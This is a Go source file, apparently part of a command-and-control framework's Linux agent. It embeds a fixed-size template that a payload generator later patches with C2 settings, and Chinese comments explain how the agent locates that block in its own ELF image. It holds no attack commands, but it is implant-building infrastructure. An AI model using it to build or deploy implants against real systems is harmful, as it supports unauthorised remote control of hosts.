//go:build linux

package main

import (
	_ "embed"

	"c2/internal/c2embed"
)

// 与 client/c2_embed_config.h 同布局；载荷生成器 PatchC2Embed 写入后，main 从 /proc/self/exe 解析。
//
// 使用 go:embed 固定 412 字节文件，保证 ELF 磁盘映像中为连续只读数据；若仅用 func()+copy 或稀疏字面量，
// 链接器可能拆散魔数，导致 FindPatchOffset 无法在文件中定位合法 C2EMBED1…C2EMBED2 块。
//
//go:embed c2embed_template.bin
var c2ExecutableEmbedBlock []byte

func init() {
	if len(c2ExecutableEmbedBlock) != c2embed.TotalSize {
		panic("cmd/linuxagent: c2embed_template.bin size != c2embed.TotalSize")
	}
}
